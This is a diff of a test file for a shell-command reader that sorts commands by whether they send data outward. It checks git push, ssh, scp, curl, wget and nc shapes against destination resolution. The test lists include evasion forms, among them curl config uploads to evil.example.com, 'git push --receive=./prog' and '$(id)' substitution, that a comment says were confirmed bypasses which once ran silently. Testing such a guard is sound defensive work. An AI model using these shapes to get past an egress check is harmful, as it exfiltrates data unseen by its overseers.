@@ -219,17 +219,16 @@ try {
     for (const c of LOCAL) assert.equal(read(c).outward, false, `local only: ${c}`);
     const KNOWN = [
       ["git push", { kind: "git", remote: null, dir: null }], ["git push origin main", { kind: "git", remote: "origin", dir: null }],
-      ["git -C site push", { kind: "git", remote: null, dir: "site" }], ["git push --repo=lab", { kind: "git", remote: "lab", dir: null }],
+      ["git -C site push", { kind: "git", remote: null, dir: null, cDirs: ["site"] }], ["git push --repo=lab", { kind: "git", remote: "lab", dir: null }],
       ["\\git push origin", { kind: "git", remote: "origin", dir: null }], ["GIT push origin", { kind: "git", remote: "origin", dir: null }], ["=git push origin", { kind: "git", remote: "origin", dir: null }],
       ["sh -c 'git push origin'", { kind: "git", remote: "origin", dir: null }], ["bash -lc \"git push origin\"", { kind: "git", remote: "origin", dir: null }],
       ["env git push origin", { kind: "git", remote: "origin", dir: null }], ["nohup git push origin &", { kind: "git", remote: "origin", dir: null }], ["sudo -u me git push origin", null],
-      ["f() { git push origin; }; f", { kind: "git", remote: "origin", dir: null }],
       ["bash +x -c 'git push origin'", { kind: "git", remote: "origin", dir: null }], ["bash --rcfile x -c 'git push origin'", { kind: "git", remote: "origin", dir: null }],
       ["git push origin main -u", { kind: "git", remote: "origin", dir: null }],
       ["bash <<EOF\ngit push origin\nEOF", { kind: "git", remote: "origin", dir: null }], ["zsh <<< 'git push origin'", { kind: "git", remote: "origin", dir: null }],
       ["echo $(git push origin)", { kind: "git", remote: "origin", dir: null }], ["git status && git push origin", { kind: "git", remote: "origin", dir: null }],
       // DEC-11f: a static `cd` step of an `&&` chain says where the push runs (the host resolves it from the shell's folder).
-      ["cd .. && git push", { kind: "git", remote: null, dir: ".." }], ["cd /w/site && git -C sub push origin", { kind: "git", remote: "origin", dir: "/w/site/sub" }],
+      ["cd .. && git push", { kind: "git", remote: null, dir: ".." }], ["cd /w/site && git -C sub push origin", { kind: "git", remote: "origin", dir: "/w/site", cDirs: ["sub"] }],
       ["ssh me@Deploy.Example.com", { kind: "dest", destination: "ssh://deploy.example.com" }], ["ssh -p 2222 host", { kind: "dest", destination: "ssh://host:2222" }],
       ["ssh -i key -o StrictHostKeyChecking=no host ls", { kind: "dest", destination: "ssh://host" }], ["ssh ssh://h:2200", { kind: "dest", destination: "ssh://h:2200" }],
       ["scp -P 2200 a.txt me@h:/x", { kind: "dest", destination: "ssh://h:2200" }], ["sftp h", { kind: "dest", destination: "ssh://h" }],
@@ -262,6 +261,8 @@ try {
       "wget -e 'post_data=x' http://h.example.com", "wget -i urls.txt", "wget --post-data=a", "wget http://e.com/$(id)",
       "nc h 80", "telnet h", "socat - TCP:h:80", "ftp h", "sendmail a@b.c < m.txt", "git status; git push \"$R\"",
       "alias gp='git push origin'; gp", "alias g=git; g push",
+      // DEC-11f verify r1: a function body runs whenever the function is called, after other commands (unknown, asked).
+      "f() { git push origin; }; f",
       // Verify 2026-11-05 (confirmed bypasses on the first head): each one ran silently there.
       "git push --rep=https://evil.example.com/x.git", "git push --receive=./prog origin", "git push --rec=on-demand", "git push --ex=./prog origin",
       "printf 'upload-file = a\\nurl = https://evil.example.com/\\n' | curl -K -", "curl -K cfg.txt", "curl --config cfg.txt", "curl --next https://evil.example.com",
@@ -330,6 +331,12 @@ try {
     // DEC-11f: the repository a push runs in is part of what is remembered, so without the shell's folder even a written-out
     // address cannot be placed in a folder with another repository inside; with it, both read.
     assert.notEqual(O.resolveOutwardDestinations(read("git push https://github.com/a/b"), "/w", runner({}), { nestedRepo: true, realpath: (p) => p }).unknown, null, "nested repository, no shell folder: unknown");
+    // Verify r1 F4: without the shell's folder a relative GIT_DIR / --git-dir names a repository relative to an unknown folder.
+    for (const c of ["GIT_DIR=r.git git push origin", "git --git-dir=r.git push origin", "git --work-tree=sub push origin"]) {
+      assert.notEqual(O.resolveOutwardDestinations(read(c), "/w", runner(origin), { realpath: (p) => p }).unknown, null, `F4, no shell folder: ${c} is unknown`);
+      const plain = (args, cwd) => runner(origin)(args.filter((x) => !/^--(git-dir|work-tree)=/.test(x)), cwd);
+      assert.equal(O.resolveOutwardDestinations(read(c), "/w", plain, { shellCwd: "/w", realpath: (p) => p }).unknown, null, `control, shell folder known: ${c} reads`);
+    }
     assert.deepEqual(O.resolveOutwardDestinations(read("git push origin"), "/w", runner(origin), { nestedRepo: true, shellCwd: "/w", realpath: (p) => p }).pairs, [{ repo: "/w/.git", destination: "https://github.com/a/b" }], "with the shell's folder: a (repository, destination) pair");
     ok(`pure reader: ${LOCAL.length} local controls, ${KNOWN.length} readable and ${UNKNOWN.length} unreadable outward shapes`);
   }
